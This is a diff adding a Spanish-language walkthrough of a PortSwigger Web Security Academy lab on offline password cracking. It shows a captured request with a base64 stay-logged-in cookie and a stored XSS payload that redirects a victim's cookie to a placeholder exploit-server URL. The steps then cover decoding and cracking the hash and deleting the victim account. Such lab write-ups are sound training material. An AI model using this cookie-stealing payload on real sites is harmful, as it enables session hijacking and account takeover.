@@ -369,4 +369,43 @@ base64.
 
 6. Finalmente nos saca una peticion con un len distinto y esa resuelve el laboratorio!
 
+# Offline password cracking
+
+Para este lab hacemos uso del XSS 
+
+1. Primero ingresamos a la cuenta de wiener nos damos cuenta que genera la misma peticion con la casilla stay logged in que es el user:hashMD5password tenemos que pensar que si podemos interceptar el hash del usuario carlos podriamos crackearlo offline con crackstation o algun otro servicio online.
+
+```
+GET /my-account HTTP/1.1
+Host: 0a3f006f03c8098ec059cdf700d400b2.web-security-academy.net
+Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; session=k7vlfcF10AHfknjtgsl9eQX2CM4CTU1F
+Cache-Control: max-age=0
+
+```
+
+3. Tambien vamos a los post y en comentarios nos damos cuenta que se puede hacer XSS
+4. Entonces hacemos uso de el XSS para robar el hash de carlos para eso portswingger simulara que carlos visito esa pagina donde pusimos nuestro xss
+5. La manera de ponerlo es la siguiente:
+
+``` 
+<script>document.location='linkdelexploitserver_para_recopilar_el_hash_MD5/'+document.cookie</script>
+```
+5. visitamos el post y portswingger simula que carlos tambien porque nos dirigimos a la pestaña de logs en el exploit server y vemos una peticion de una ip diferente lo que nos dice que fue carlos
+6. obtenemos su cookie y decodeamos base64 y entramos a la cuenta de carlos borramos el user y se reolvio el lab.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
